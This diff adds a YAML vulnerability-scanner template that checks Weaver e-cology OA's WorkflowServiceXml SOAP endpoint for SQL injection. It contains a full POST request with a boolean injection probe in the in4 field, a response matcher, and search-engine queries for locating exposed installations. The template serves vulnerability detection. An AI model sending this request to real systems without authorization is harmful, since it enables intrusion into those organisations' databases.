@@ -1,0 +1,46 @@
+id: Weaver_OA-E-Cology-WorkflowServiceXml_SQLi
+
+info:
+  name: Weaver_OA-E-Cology-WorkflowServiceXml_SQLi
+  author: security-xm
+  severity: high
+  description: 泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: app="泛微-OA（e-cology）"
+    Qukae-query: app:"泛微 e-Cology协同商务系统"
+    Hunter-query: app.name="泛微 e-cology OA"
+    verified: true
+
+http:
+  - raw:
+    - |-
+      @timeout: 30s
+      POST /services/WorkflowServiceXml HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+      Content-Type: text/xml
+      Accept-Encoding: gzip
+      Content-Length: 501
+
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
+        <soapenv:Body>
+            <web:getHendledWorkflowRequestList>
+              <web:in0>1</web:in0>
+              <web:in1>1</web:in1>
+              <web:in2>1</web:in2>
+              <web:in3>1</web:in3>
+              <web:in4>
+                  <web:string>1=1 AND 5615=5615</web:string>
+              </web:in4>
+            </web:getHendledWorkflowRequestList>
+        </soapenv:Body>
+      </soapenv:Envelope>
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+        - WorkflowRequestInfo
